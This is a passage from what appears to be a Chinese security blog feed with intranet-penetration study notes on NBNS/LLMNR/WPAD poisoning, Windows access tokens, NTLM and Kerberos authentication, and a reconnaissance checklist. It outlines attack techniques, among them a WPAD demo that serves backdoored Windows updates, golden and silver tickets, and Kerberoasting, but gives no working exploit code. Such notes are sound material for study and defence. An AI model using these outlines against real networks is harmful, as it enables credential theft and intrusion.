class="line">NETBIOS(网络基本输入输出系统),严格讲不属于网络协议,NETBIOS是应用程序接口(API),早</span><br><span class="line">期使用NetBIOS Frames(NBF)协议进行运作,是一种非路由网络协议,位于传输层‘后期NetBIOS over</span><br><span class="line">TCP&#x2F;IP(缩写为NBT、NetBT)出现,使之可以连接到TCP&#x2F;IP,是一种网络协议,位于会话层。基于</span><br><span class="line">NETBIOS协议广播获得计算机名称——解析为相应IP地址,WindowsNT以后的所有操作系统上均可以</span><br><span class="line">用,不支持IPV6</span><br><span class="line">NBNS 解析</span><br><span class="line">解析过程:</span><br><span class="line">监听udp&#x2F;137端口检查地 NetBIOS 缓存</span><br><span class="line">如果缓存中没有请求的名称且已配置了 WINS 服务器,接下来则会向 WINS 服务器发出请求</span><br><span class="line">如果没有配置 WINS 服务器或 WINS 服务器无响应则会向当前子网域发送广播</span><br><span class="line">如果发送广播后无任何主机响应则会读取本地的 Imhosts 文件</span><br></pre></td></tr></table></figure><h5 id="WPAD"><a href="#WPAD" class="headerlink" title="WPAD"></a>WPAD</h5><p>WPAD(Web Proxy Auto-Discovery Protocol)</p><p>网络代理自动发现协议</p><p>通过让浏览器自动发现代理服务器,定位代理配置文件,下载编译并运行,最终自动使用代理访问网络</p><p>PAC:全程代理自动配置文件(Proxy Auto-Config),定义了浏览器和用户如何自动选择适当的代理服<br>务器来访问一个URL</p><p>例子(WPAD标准是用 wpad.dat):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function FindProxyForURL(url,host)&#123;</span><br><span class="line">if(url &#x3D;&#x3D; &#39;http:&#x2F;&#x2F;www.baidu.com&#39;) return &quot;DIRECT&quot;;</span><br><span class="line">if(host &#x3D;&#x3D; &#39;twitter.com&#39;) return &#39;SOCKS 127.0.0.10:7070&#39;;</span><br><span class="line">if(dnsResolve(host) &#x3D;&#x3D; &#39;10.0.0.100&#39;) return &#39;PROXY 127.0.0.1:8086;DIRECT&#39;;</span><br><span class="line">return &#39;DIRECT&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>WPAD 请求流程</p><p><img src="/images/pasted-123.png" alt="upload successful"></p><h5 id="WPAD配合LLMNR-NBNS投毒"><a href="#WPAD配合LLMNR-NBNS投毒" class="headerlink" title="WPAD配合LLMNR/NBNS投毒"></a>WPAD配合LLMNR/NBNS投毒</h5><p><img src="/images/pasted-124.png" alt="upload successful"></p><h6 id="LLMNR-工作流程"><a href="#LLMNR-工作流程" class="headerlink" title="LLMNR 工作流程"></a>LLMNR 工作流程</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">通过UDP发送到组播地址224.0.0.252:5355,查询主机名对应的IP,使用的是DNS格式数据包,数据包</span><br><span class="line">会被限制在本地子网中。</span><br><span class="line">本地子网中所有支持LLMNR的主机在受到查询请求时,会对比自己的主机名是否相同,不同就丢弃,</span><br><span class="line">相同就发送包含自己IP的单播信息给查询主机。</span><br><span class="line">检查本地 NetBIOS 缓存</span><br><span class="line">如果缓存中没有则会向当前子网域发送广播</span><br><span class="line">当前子网域的其他主机收到并检查广播包,如果没有主机响应则请求失败</span><br></pre></td></tr></table></figure><h6 id="WPAD配合LLMNR-NBNS投毒-Fix"><a href="#WPAD配合LLMNR-NBNS投毒-Fix" class="headerlink" title="WPAD配合LLMNR/NBNS投毒(Fix)"></a>WPAD配合LLMNR/NBNS投毒(Fix)</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">MS16-077</span><br><span class="line">1.以WinHTTP请求PAC时,不发送客户端的net-NTLM Hash</span><br><span class="line">2.不广播请求解析WPAD,只能通过如DHCP或DNS完成</span><br><span class="line">Bypass:</span><br><span class="line">1.</span><br><span class="line">(1)不直接获取net-ntln Hash,通过返回伪造wpad,插入如xss等获取net-ntlm hash</span><br><span class="line">(2)返回如407错误(需要代理身份验证),浏览器自动域BadProxyServer身份认证</span><br><span class="line">2.DHCPv6 Get IPV6</span><br><span class="line"></span><br><span class="line">ipv6 &gt; ipv4</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="WPAD-Demo"><a href="#WPAD-Demo" class="headerlink" title="WPAD Demo"></a>WPAD Demo</h5><p>1.监听当前网络,如果收到了NBNS查询包含WPAD字符,立即伪造NBNS响应</p><p>2.提供WPAD服务,用来更改被攻击主机的WPAD设置</p><p>3.当其成功作为被攻击主机的代理后,会劫持特定的Windows更新请求,提供带有后门的windows更新<br>文件给用户下载</p><h5 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h5><p>WMI(windows管理规范),由一系列对Windows Driver Model的扩展组成,它通过仪器组件提供信息<br>和通知,提供了一个操作系统的接口。在渗透测试过程中,攻击者往往使用脚本通过WMI接口完成对<br>Windows操作系统的操作,远程WMI连接通过DCOM进行。例如:WMIC、Invoke-WmiCommand、<br>Invoke-WMIMethod等。另一种方法是使用Windows远程管理(WinRM)</p><h5 id="Windows-Access-Token-简介"><a href="#Windows-Access-Token-简介" class="headerlink" title="Windows Access Token 简介"></a>Windows Access Token 简介</h5><p>Windows Access Token(访问令牌),它是一个描述进程或者线程安全上下文的一个对象。不同的用<br>户登录计算机后,都会生成一个Access Token,这个Token在用户创建进程或者线程时会被使用,不断<br>的拷贝,这也就解释了A用户创建一个进程而该进程没有B用户的权限。当用户注销后,系统将会使主令<br>牌切换为模拟令牌,不会讲令牌清除,只有在重启机器后才会清除</p><p>Access Token分为两种(主令牌、模拟令牌)</p><h5 id="Windows-Access-Token-组成"><a href="#Windows-Access-Token-组成" class="headerlink" title="Windows Access Token 组成"></a>Windows Access Token 组成</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">用户账户的安全标识符(SID)</span><br><span class="line">用户所属的组的SID</span><br><span class="line">用户标识当前登录会话的登录SID</span><br><span class="line">用户或用户组所拥有的权限列表</span><br><span class="line">所有者的SID</span><br><span class="line">主要组的SID</span><br><span class="line">访问控制列表</span><br><span class="line">访问令牌的来源</span><br><span class="line">令牌是主要令牌还是模拟令牌</span><br><span class="line">限制SID的可选列表</span><br><span class="line">目前的模拟等级</span><br><span class="line">其他统计数据</span><br></pre></td></tr></table></figure><h5 id="SID"><a href="#SID" class="headerlink" title="SID"></a>SID</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">安全标示符是一个唯一的字符串,它可以代表一个账户、一个用户组、或者是一次登录。通常它还有一</span><br><span class="line">个SID固定列表,例如Everyone这种已经内置的账户,默认拥有固定的SID。</span><br><span class="line">SID表现形式:</span><br><span class="line">域SID-用户ID</span><br><span class="line">计算机SID - 用户ID</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透-Windows认证协议</title>
      <link href="2021/06/23/nei-wang-shen-tou-windows-ren-zheng-xie-yi/"/>
      <url>2021/06/23/nei-wang-shen-tou-windows-ren-zheng-xie-yi/</url>
      
        <content type="html"><![CDATA[<h4 id="本地认证流程"><a href="#本地认证流程" class="headerlink" title="本地认证流程"></a>本地认证流程</h4><p>Windows Logon Process(即 winlogon.exe),Winlogon 是负责处理安全相关的用户交互界面的组<br>件。<br>Winlogon的工作包括加载其他用户身份安全组件、提供图形化的登录界面,以及创建用户会话。<br>LSASS(本地安全认证子系统服务)用于微软Windows系统的安全机制。它负责Windows系统安全策略。<br>它负责用户在本地验证或远程登陆时验证用户身份,管理用户密码变更,并产生访问日志。<br>用户注销、重启、锁屏后,操作系统会让winlogon显示图形化登录界面,也就是输入框,接收域名、用<br>户名、密码后交给lsass进程,将明文密码加密成NTLM Hash,对SAM数据库比较认证,相同则认证成<br>功。</p><ul><li>winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证)</li><li>Windows Logon Process(即winlogon.exe),是Windows NT户登陆程序,用于管理用户登录<br>和退出。</li><li>LSASS用于微软Windows系统的安全机制,它用于本地安全和登陆策略。</li></ul><h4 id="Windows网络认证"><a href="#Windows网络认证" class="headerlink" title="Windows网络认证"></a>Windows网络认证</h4><h5 id="认证"><a href="#认证" class="headerlink" title="认证"></a>认证</h5><p>你怎么证明你知道你所声称的用户的密码?(如何证明你是你)</p><h5 id="认证分类"><a href="#认证分类" class="headerlink" title="认证分类"></a>认证分类</h5><ul><li>账号密码认证</li></ul><p>通过向服务端发送“账号密码”来证明自己的身份</p><ul><li>挑战认证</li></ul><p>通过向服务端发送“一段计算结果”来证明自己的身份</p><ul><li>Kerberos 认证</li></ul><p>通过向服务端发送一张“票”,来证明自己的身份</p><h5 id="密钥"><a href="#密钥" class="headerlink" title="密钥"></a>密钥</h5><p>长期密钥:被长期密钥加密的数据不应该在网络上传输,因为有的密钥可能长期内保持不变,比如密码</p><p>短期密钥:由于被长期密钥加密的数据包不能在网络上传送,所以需要使用另一种密钥来加密需要进行<br>网络传输的数据。这种密钥只在一段时间内有效,即使加密过的数据包被黑客截获,等他把密钥计算出<br>来的时候,这个密钥早就已经过期了。我们把这种密钥称为短期密钥。</p><h4 id="NTLM认证"><a href="#NTLM认证" class="headerlink" title="NTLM认证"></a>NTLM认证</h4><p>Client(客户端)、Server(服务端)</p><p>历史版本</p><ul><li><p>NTLMv1:服务器通过发送一个8字节的随机数(挑战)来验证客户端,客户端返回两个24字节Hash进<br>行计算并返回计算结果。</p></li><li><p>NTLMv2:它通过加强协议来抵御许多欺骗攻击,并增加服务器向客户端进行身份验证的能力,从而增<br>强了NTLM的安全性。服务器通过发送一个16字节的HMAC - MD5随机数(挑战)来验证客户端。</p><h5 id="NTLM认证-认证流程图解-工作组"><a href="#NTLM认证-认证流程图解-工作组" class="headerlink" title="NTLM认证 认证流程图解(工作组)"></a>NTLM认证 认证流程图解(工作组)</h5></li></ul><p><img src="/images/pasted-110.png" alt="upload successful"></p><h5 id="NTLM认证-认证流程-工作组"><a href="#NTLM认证-认证流程-工作组" class="headerlink" title="NTLM认证 认证流程(工作组)"></a>NTLM认证 认证流程(工作组)</h5><h6 id="1-协商"><a href="#1-协商" class="headerlink" title="[1] 协商"></a>[1] 协商</h6><p>1.Clint向Server发送TYPE 1 Negotiate 协商信息,确定协议版本</p><p>2.服务端接收到客户端发送过来的 TYPE 1 消息,会读取其中的内容,并从中选择出自己所能接收的服<br>务内容,加密等级,安全服务等等。然后</p><h6 id="2-质询"><a href="#2-质询" class="headerlink" title="[2] 质询"></a>[2] 质询</h6><p>1.Client向Server发送明文用户名消息作为请求</p><p>2.Server收到请求,验证是否存在Client发来的用户名,如果存在,传入 NTLM SSP ,得到<br>NTLM_CHALLENGE 信息。</p><p>3.将16位的随机数(Challenge)发送给Cilent,并使用SAM中查询用户名对应的NTLM Hash加密<br>Chanllenge,生成Net-NTLM Hash存放在内存中。</p><p>4.Client使用发送的用户名对应的NTLM Hash加密Challenge,将结果(Response)发送给Server</p><h6 id="3-验证"><a href="#3-验证" class="headerlink" title="[3] 验证"></a>[3] 验证</h6><p>Server收到Client发送的Response,将接收的Response与Net-NTLM Hash进行比较,如果相同,则认<br>证通过。<br>注:每次生成的16字节的Challenge都不同,保证的安全性。</p><h5 id="NTLM认证-认证流程图解-域"><a href="#NTLM认证-认证流程图解-域" class="headerlink" title="NTLM认证 认证流程图解(域)"></a>NTLM认证 认证流程图解(域)</h5><p><img src="/images/pasted-111.png" alt="upload successful"></p><h5 id="NTLM认证-认证流程-域"><a href="#NTLM认证-认证流程-域" class="headerlink" title="NTLM认证 认证流程(域)"></a>NTLM认证 认证流程(域)</h5><p>1.用户通过输入Windows账号和密码登录客户端主机,客户端会缓存密码的哈希值NTLM-Hash。成功<br>登录客户端的用户如果试图访问服务器资源,需要向对方发送一个请求,该请求利用 NTLM SSP 生成<br>NTLM_NEGOTIATE 消息(被称为 TYPE 1消息,Negotiate 协商消息),并将 TYPE 1 消息发送给服务<br>端中,该TYPE 1消息中包含一个以明文表示的用户名以及其他的一些协商信息(认证的主题,机器以及<br>需要使用的安全服务等等信息)</p><p>2.服务端接收到客户端发送过来的 TYPE 1 消息,会读取其中的内容,并从中选择出自己所能接受的服<br>务内容,加密等级,安全服务等等。然后传入 NTLM SSP,得到 NTLM_CHALLENGE 消息(被称为<br>TYPE 2消息,Challenge 挑战信息),并将此 TYPE 2消息发回给客户端。此TYPE 2消息中包含了一个<br>由服务端生成的16位随机值,此随机值被称为 Challenge,服务器将该Challenge保存起来。</p><p>3.客户端收到服务器端返回的 TYPE 2消息, 读取出服务端所支持的内容,并取出其中的随机值<br>Challenge,用缓存的密码的哈希值NTLM-Hash对其进行加密,得到 Net NTLM-Hash(加密后的<br>Challenge),并且将 Net NTLM-Hash封装到 NTLM-AUTH 消息中(被称为 TYPE 3 消息,<br>Authenticate认证消息),发往服务端。</p><p>5.DC根据用户获取该账号的密码哈希值 NTLM-Hash,用密码哈希值 NTLM-Hash 对原始的 Challenge<br>进行加密得到Net NTLM-Hash。如果加密后的Challenge和服务器发送的一致,则意味着用户拥有正确<br>的密码,验证通过,否则验证失败。DC将验证结果发给服务器。</p><p>6.服务器根据DC返回的结果,对客户端进行回复。</p><h5 id="double-hop-双跃点"><a href="#double-hop-双跃点" class="headerlink" title="double-hop (双跃点)"></a>double-hop (双跃点)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">impersonate:</span><br><span class="line">主要分为两个级别impersonation和delegation。</span><br><span class="line">impersonation:服务端可以使用客户端的身份访问本地资源。主要因为Double-hop authentication</span><br><span class="line">问题,PSEXESVC使用impersonation,主要因为NTLM SSP不支持委派,NTLM 主要使用用户原始密码</span><br><span class="line">验证身份,所以无法使用网络资源。</span><br><span class="line">Double-hop authentication (双跳认证)</span><br><span class="line">NTLM在转发认证时,只能使用用户原始密码验证身份,所以中间的服务端只能使用匿名身份或者自己</span><br><span class="line">的身份访问Server。</span><br><span class="line">Kerberos因为使用票据进行验证,中间的服务端可以将客户的票据进行转发访问其他服务。delegation服务端可以使用客户端的身份访问本地和网络资源,Kerberos支持该级别的</span><br><span class="line">Impersonation,但是需要在域控制器进行特别的配置。</span><br></pre></td></tr></table></figure><h5 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">地狱三头犬</span><br><span class="line">Kerberos实现不依赖于主机操作系统的认证,无需基于主机地址的信任,不要求网络上所有主机的物理</span><br><span class="line">安全,并假定网络上传送的数据包可以被任意地读取.修改和插入数据。</span><br><span class="line">Kerberos 作为一种可信任的第三方认证服务,是通过传统的密码技术(如:共享密钥)执行认证服务</span><br><span class="line">的。</span><br><span class="line">RFC 4120 V5</span><br><span class="line">Tips:</span><br><span class="line">在域环境中,默认先使用Kerberos进行认证,当使用kerberos认证出现错误时使用NTLM认证。</span><br><span class="line">RFC4120 V5版本:https:&#x2F;&#x2F;tools.ietf.org&#x2F;html&#x2F;rfc4120</span><br></pre></td></tr></table></figure><h5 id="Kerberos会使用的端口"><a href="#Kerberos会使用的端口" class="headerlink" title="Kerberos会使用的端口"></a>Kerberos会使用的端口</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">TCP和UDP的88(Kerberos)端口:身份验证和票证授予</span><br><span class="line">TCP和UDP的464端口:经典Kerberos Kpaswd(密码重设)协议</span><br><span class="line">Kerberos 认证名词</span><br><span class="line">AS:身份认证服务(验证Client身份)</span><br><span class="line">KDC:密钥分发中心(域内最重要的服务器,域控制器)</span><br><span class="line">TGT:票据中心用户信授予的票据(访问 TGS 服务的票)</span><br><span class="line">TGS:票据授权服务</span><br><span class="line">ST:访问服务的票据</span><br><span class="line">Krbtgt:每个域中都有krbtgt账户,此账户是KDC的服务账户用来创建TGT</span><br><span class="line">Principal:认证主体</span><br><span class="line">PAC:特权属性证书(用户的SID,用户所在的组)</span><br><span class="line">SPN:服务主体名称</span><br><span class="line">Session Key(临时会话密钥a,只有Client和TGS知道,在Kerberos认证中至关重要)</span><br><span class="line">Server Session Key(临时会话密钥b,只有Client和Service知道,在Kerberos认证中至关重要)</span><br></pre></td></tr></table></figure><h5 id="Kerberos-认证流程"><a href="#Kerberos-认证流程" class="headerlink" title="Kerberos 认证流程"></a>Kerberos 认证流程</h5><p>Client(客户端)</p><p>Server(服务端)</p><p>KDC(也就是参与认证的域控制器)</p><p>1.Client请求KDC的AS服务拿到TGT</p><p>2.Client拿着TGT 请求 KDC 的 TGS 服务拿到ST</p><p>3.Client拿着ST访问Server</p><p><img src="/images/pasted-113.png" alt="upload successful"></p><h5 id="Kerberos-认证流程图解"><a href="#Kerberos-认证流程图解" class="headerlink" title="Kerberos 认证流程图解"></a>Kerberos 认证流程图解</h5><p><img src="/images/pasted-112.png" alt="upload successful"></p><h5 id="Client向KDC-AS申请TGT-1"><a href="#Client向KDC-AS申请TGT-1" class="headerlink" title="Client向KDC-AS申请TGT(1)"></a>Client向KDC-AS申请TGT(1)</h5><p>Client—–&gt;KDC-AS(AS-REQ)</p><p>客户端发送由client Authenticator1到AS 通过Client NTLM hash(长期密钥)加密的<br>时间戳(防止重放攻击)</p><p>Client Name</p><p>Service Name</p><p>AS-REQ域用户枚举</p><h5 id="Client向KDC-AS申请TGT-2"><a href="#Client向KDC-AS申请TGT-2" class="headerlink" title="Client向KDC-AS申请TGT(2)"></a>Client向KDC-AS申请TGT(2)</h5><p>KDC-AS ——-&gt; Client(AS - REP)</p><p>1.身份验证服务(KDC-AS)使用用户NTLM解密时间戳,解密成功(KDC-AS)检查用户的信息(登录<br>限制.组成员身份等)并创建TGT<br>2.向本地LSA(Local Security Authority)请求生成一个特殊的数据PAC(使用krbtgt密钥进行签名)KDC<br>随机生成一个短期会话密钥(Session Key),此时AS向Client发送两条信息<br>(1)TGT(使用krbtgt NTLM Hash加密),内容包含:<br>User Name、Domain Name、组成员资格<br>TGS Name时间戳、IP地址<br>TGT的生命周期、Session Key<br>(2)另一条信息T(C)(使用Client申请TGT时使用的用户名对应的NTLM Hash加密),内容包含:TGS<br>Name、时间戳、TGT的生命周期、Session Key<br>SESSION KEY 离线爆破</p><h5 id="Client拿着TGT-请求-KDC的TGS服务拿到ST-1"><a href="#Client拿着TGT-请求-KDC的TGS服务拿到ST-1" class="headerlink" title="Client拿着TGT 请求 KDC的TGS服务拿到ST(1)"></a>Client拿着TGT 请求 KDC的TGS服务拿到ST(1)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Client-&gt;KDC-TGS (TGS_REQ)</span><br><span class="line">Client:</span><br><span class="line">使用NTLM Hash解密 T(C)获得Session Key</span><br><span class="line">1.Client向TGS发送消息</span><br><span class="line">(1)Authenticator(使用Session Key加密),内容包含:</span><br><span class="line">User Name</span><br><span class="line">时间戳</span><br><span class="line">TGT</span><br><span class="line">需要访问的服务名称</span><br><span class="line">(2)TGT (使用krbtgt加密)</span><br><span class="line">Session Key</span><br><span class="line">黄金票据(伪造TGT,前提是获取krbtgt账号的口令散列值)</span><br><span class="line">Forwardable TGT或Unconstrained delegation(非受限委派或无限制委派)</span><br><span class="line">Client-&gt;KDC-TGS</span><br><span class="line">KDC:</span><br><span class="line">1.KDC使用Ktbtgt NTLM Hash对TGT解密,获取Client信息和Session Key</span><br><span class="line">2.使用Session Key对Client发来对Authenticator信息解密,对比TGT信息,相同则认证通过</span><br></pre></td></tr></table></figure><h5 id="Client拿着TGT-请求-KDC的TGS服务拿到ST-2"><a href="#Client拿着TGT-请求-KDC的TGS服务拿到ST-2" class="headerlink" title="Client拿着TGT 请求 KDC的TGS服务拿到ST(2)"></a>Client拿着TGT 请求 KDC的TGS服务拿到ST(2)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">KDC-TGS-&gt;Client(TGS-REP)</span><br><span class="line">KDC:</span><br><span class="line">TGS生成Server Session Key</span><br><span class="line">1.TGS生成Client需要访问服务的ST发送给Client,Ticket使用目标服务账户的NTLM Hash加密:</span><br><span class="line">(1) Client Name</span><br><span class="line">(2) Server Session Key</span><br><span class="line">2.使用Session Key加密的Server Session Key,内容:</span><br><span class="line">(1)Server Name</span><br><span class="line">(2)时间戳</span><br><span class="line">(3)Server Session Key</span><br><span class="line">Client:</span><br><span class="line">Client收到信息后,使用Session Key解密获得Server Session Key</span><br><span class="line">KERBEROAST</span><br></pre></td></tr></table></figure><h5 id="Client拿着ST访问Server-1"><a href="#Client拿着ST访问Server-1" class="headerlink" title="Client拿着ST访问Server(1)"></a>Client拿着ST访问Server(1)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Client -&gt; Server (AP-REQ)</span><br><span class="line">Client:</span><br><span class="line">1.Client发送由Server Session Key加密的Authenticatorticator信息和ST访问Server,内容:</span><br><span class="line">(1)ST</span><br><span class="line">(2)时间戳</span><br><span class="line">2.ST(Server NTLM Hash加密)</span><br><span class="line">(1)Server Session Key</span><br><span class="line">(2) Client Name</span><br><span class="line">白银票据(伪造TGS,前提是获取服务账号的口令散列值)</span><br></pre></td></tr></table></figure><h5 id="Client拿着ST访问Server-2"><a href="#Client拿着ST访问Server-2" class="headerlink" title="Client拿着ST访问Server(2)"></a>Client拿着ST访问Server(2)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Server:</span><br><span class="line">1.Server使用NTLM Hash解密ST,获得Server Session Key,使用Server Session Key解密</span><br><span class="line">Authenticator信息,对比Authenticator信息中的Client信息和Ticket中的Client信息对比,将</span><br><span class="line">Authenticator信息的时间戳和Ticket的时间戳是否相同(误差2min)</span><br><span class="line">2.Server使用Server Session Key加密Authenticator信息,内容包含:</span><br><span class="line">(1)ID</span><br><span class="line">(2)时间戳</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透-打点</title>
      <link href="2021/06/23/nei-wang-shen-tou-da-dian/"/>
      <url>2021/06/23/nei-wang-shen-tou-da-dian/</url>
      
        <content type="html"><![CDATA[<h4 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h4><ul><li>OSINT</li><li>打点流程概述</li><li>打点技术细节扩展</li><li>模拟一次完整流程</li></ul><p><img src="/images/pasted-107.png" alt="upload successful"></p><h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h4><ul><li>主动、被动</li></ul><p>(1)OSINT</p><p>(2)Web Pentester</p><h4 id="ONSIT"><a href="#ONSIT" class="headerlink" title="ONSIT"></a>ONSIT</h4><p>1.1 OSINT<br>公开资源情报计划(Open source intelligence ),简称OSINT,是美国中央情报局(CIA)的一种情报<br>收集手段,从各种公开的信息资源中寻找的获取有价值的情报。</p><h4 id="Technology-OSINT"><a href="#Technology-OSINT" class="headerlink" title="Technology OSINT"></a>Technology OSINT</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.domain、SubDomain、Email Address</span><br><span class="line">2.IP Address、Port</span><br><span class="line">3.DNS Records</span><br><span class="line">4.Certificates、WHOIS</span><br><span class="line">5.Service Banner (Wappalyzer)</span><br><span class="line">6.Threat information</span><br></pre></td></tr></table></figure><p>参考:<a href="https://www.randhome.io/blog/2019/01/05/2019-osint-guide/">https://www.randhome.io/blog/2019/01/05/2019-osint-guide/</a></p><h5 id="Company-OSINT"><a href="#Company-OSINT" class="headerlink" title="Company OSINT"></a>Company OSINT</h5><p>Full Name、Username、Email Address、Images</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.社交媒体(如FaceBook、Twitter)</span><br><span class="line">2.新闻媒体</span><br><span class="line">3.Employee(Linkedin)</span><br><span class="line">4.招聘网站</span><br><span class="line">5.GitHub Search</span><br></pre></td></tr></table></figure><p>参考:<br><a href="https://www.randhome.io/blog/2019/01/05/2019-osint-guide/">https://www.randhome.io/blog/2019/01/05/2019-osint-guide/</a></p><h5 id="OSINT-Tools"><a href="#OSINT-Tools" class="headerlink" title="OSINT Tools"></a>OSINT Tools</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Online : Shodan、ZoomEye、Fofa、微步在线、VirusTotal、censys、crt.sh</span><br><span class="line">搜素引擎:Google、WikiPedia、Yandex、Bing</span><br><span class="line">SubDomain + Email Address :</span><br><span class="line">Teemo、Sublist3r、theHarvester、wydomain、subDomainsBrute</span><br><span class="line">Dns:dnsrecon</span><br><span class="line">Frameworks :Maltego、SpiderFoot、datasploit、Recon-Ng</span><br><span class="line">Misc:公开泄露数据库、Github</span><br></pre></td></tr></table></figure><h4 id="什么是点-怎么打"><a href="#什么是点-怎么打" class="headerlink" title="什么是点?怎么打?"></a>什么是点?怎么打?</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">打点 [ 俗称&quot;撕口子(特指内网口)&quot;,由此可知,主要目的经历可能并不在点上,而在内网]</span><br><span class="line">常规 Web 打法 [ 很显然,此处的web指的就是其中一个“点”]</span><br><span class="line">基础web漏洞[ 此处暂以能快速 getshell 的洞为主,一些边缘性漏洞暂不考虑]</span><br><span class="line">入口弱口令 [ 包括各平台目标历史漏洞中遗留的各种账号密码]</span><br><span class="line">任意上传 &#x2F; 下载 &#x2F; 读取</span><br><span class="line">越权 &#x2F; 未授权</span><br><span class="line">包含</span><br><span class="line">命令&#x2F;代码执行</span><br><span class="line">Sql注入</span><br><span class="line">XXE&#x2F;Ssrf &#x2F;xss</span><br><span class="line">反序列化</span><br><span class="line">目标自身或者第三方搜素引擎上的各类敏感泄露[eg: .git、.svn、网站敏感文件泄露...]</span><br><span class="line">逻辑漏洞</span><br><span class="line">各种开源程序的 Nday 利用 ...</span><br><span class="line">各类中间件的 Nday 利用...</span><br><span class="line">各种基础服务端口利用 ...</span><br><span class="line">等等</span><br></pre></td></tr></table></figure><h4 id="邮件打法"><a href="#邮件打法" class="headerlink" title="邮件打法"></a>邮件打法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[ 此处的邮件则是另一个 